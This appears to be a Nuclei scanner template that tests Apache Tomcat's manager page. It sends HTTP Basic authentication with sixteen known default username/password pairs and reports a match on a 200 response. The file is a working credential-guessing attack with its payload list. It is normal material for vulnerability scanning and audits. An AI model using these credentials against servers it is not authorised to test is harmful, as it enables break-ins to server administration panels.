id: tomcat-manager-default
info:
  author: pdteam
  name: tomcat-manager-default-password
  severity: high
  tags: tomcat,apache,default-login
requests:
- attack: pitchfork
  matchers:
  - status:
    - 200
    type: status
  - type: word
    words:
    - Apache Tomcat
  matchers-condition: and
  payloads:
    password:
    - tomcat
    - admin
    - OvW*busr1
    - j2deployer
    - kdsxc
    - ADMIN
    - xampp
    - s3cret
    - QLogic66
    - tomcat
    - root
    - role1
    - changethis
    - changethis
    - j5Brn9
    - tomcat
    username:
    - tomcat
    - admin
    - ovwebusr
    - j2deployer
    - cxsdk
    - ADMIN
    - xampp
    - tomcat
    - QCC
    - admin
    - root
    - role1
    - role
    - tomcat
    - admin
    - role1
  raw:
  - 'GET /manager/html HTTP/1.1

    Host: {{Hostname}}

    Authorization: Basic {{base64(username + '':'' + password)}}

    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like
    Gecko) Chrome/55.0

    Accept-Language: en-US,en;q=0.9

    Connection: close

    '
